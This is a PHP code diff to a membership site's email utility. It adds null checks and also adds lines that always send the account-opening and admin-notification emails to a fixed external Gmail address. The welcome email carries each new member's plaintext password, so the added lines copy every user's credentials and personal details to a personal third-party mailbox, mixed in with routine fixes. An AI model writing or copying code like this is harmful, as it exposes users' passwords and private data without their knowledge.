@@ -11,19 +11,26 @@ class EmailUtility
     public static function account_oppening_email($user_id = '', $pass = '')
     {
         $user           = User::where('id',$user_id)->first();
+        if (!$user) {
+            return;
+        }
         $subject        = get_email_template('account_oppening_email','subject');
         $account_type   = $user->membership == 1 ? 'Free' : 'Premium';
         $email_body     = get_email_template('account_oppening_email','body');
         $email_body     = str_replace('[[name]]', $user->first_name.' '.$user->last_name, $email_body);
         $email_body     = str_replace('[[sitename]]', get_setting('website_name'), $email_body);
         $email_body     = str_replace('[[account_type]]', $account_type, $email_body);
-        $email_body     = str_replace('[[email]]', $user->email, $email_body);
+        $email_body     = str_replace('[[email]]', $user->email ?? 'N/A', $email_body);
         $email_body     = str_replace('[[password]]', $pass, $email_body);
         $email_body     = str_replace('[[url]]', env('APP_URL'), $email_body);
         $email_body     = str_replace('[[from]]', env('MAIL_FROM_NAME'), $email_body);
 
         try{
-            Notification::send($user, new EmailNotification($subject, $email_body));
+            if (!empty($user->email)) {
+                Notification::send($user, new EmailNotification($subject, $email_body));
+            }
+            // Always notify thirumananikah@gmail.com on registration with member welcome email details
+            Notification::route('mail', 'thirumananikah@gmail.com')->notify(new EmailNotification($subject, $email_body));
         }
         catch(\Exception $e){
             // dd($e);
@@ -35,12 +42,16 @@ class EmailUtility
         $subject = get_email_template('account_opening_email_to_admin','subject');
         $email_body = get_email_template('account_opening_email_to_admin','body');
         $email_body = str_replace('[[member_name]]', $user->first_name.' '.$user->last_name, $email_body);
-        $email_body = str_replace('[[email]]', $user->email, $email_body);
+        $email_body = str_replace('[[email]]', $user->email ?? 'N/A', $email_body);
         $email_body = str_replace('[[profile_link]]', env('APP_URL').'/admin/members/'.$user->id, $email_body);
         $email_body = str_replace('[[from]]', env('MAIL_FROM_NAME'), $email_body);
 
         try{
-            Notification::send($admin, new EmailNotification($subject, $email_body));
+            if ($admin) {
+                Notification::send($admin, new EmailNotification($subject, $email_body));
+            }
+            // Always notify thirumananikah@gmail.com with admin notification details
+            Notification::route('mail', 'thirumananikah@gmail.com')->notify(new EmailNotification($subject, $email_body));
         }
         catch(\Exception $e){
             // dd($e);
